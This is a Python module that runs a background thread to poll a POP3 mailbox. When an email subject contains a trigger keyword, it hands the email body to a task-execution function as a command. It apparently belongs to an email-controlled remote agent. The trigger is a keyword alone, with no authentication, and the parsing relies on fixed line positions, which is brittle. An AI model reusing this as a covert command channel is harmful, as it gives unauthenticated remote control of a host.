#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Zunayed Hassan'

import threading
import time
import poplib
from email import parser
from Settings import *
from CommonTools import *


"""
CLASS NAME:     ReceiveEmail

PURPOSE:        Check for new email continuously
"""
class ReceiveEmail(threading.Thread):
    _lastTime = 0
    _currentTime = 0
    _emailSendingFailed = True

    """
    METHOD NAME:    run
    PARAMETER:      None
    RETURN:         None

    ALGORITHM:      1. Check for new email
                    2. Extract its subject and body
                    3. If this email is from author, by judging it subject then, execute command (from body)
                    4. Continue step 1 to step 3
    """
    def run(self):
        self._lastTime = time.time()

        while True:
            self._currentTime = time.time()

            if (self._currentTime - self._lastTime) >= EMAIL_CHECKING_INTERVAL:
                try:
                    pop_conn = poplib.POP3_SSL(AGENT_EMAIL_RECEIVING_SERVER, AGENT_EMAIL_RECEIVING_PORT)
                    pop_conn.user(AGENT_EMAIL_ADDRESS)
                    pop_conn.pass_(AGENT_EMAIL_PASSWORD)

                    # Get messages from server:
                    messages = [pop_conn.retr(i) for i in range(1, len(pop_conn.list()[1]) + 1)]

                    # Extracting subject and body
                    for messgae in messages:
                        subject = messgae[1][38].decode("utf-8")
                        body = messgae[1][46].decode("utf-8")

                        # If the message is from author, by judging from "Subject" part of the email, then consider its
                        # "Body" part as command argument. So, get ready to execute that.
                        if "spice_hq_command" in subject:
                            PerformTask(body)

                    pop_conn.quit()
                    self._emailSendingFailed = False

                except:
                    self._emailSendingFailed = True

                finally:
                    self._lastTime = time.time()

            time.sleep(EMAIL_CHECKING_INTERVAL)

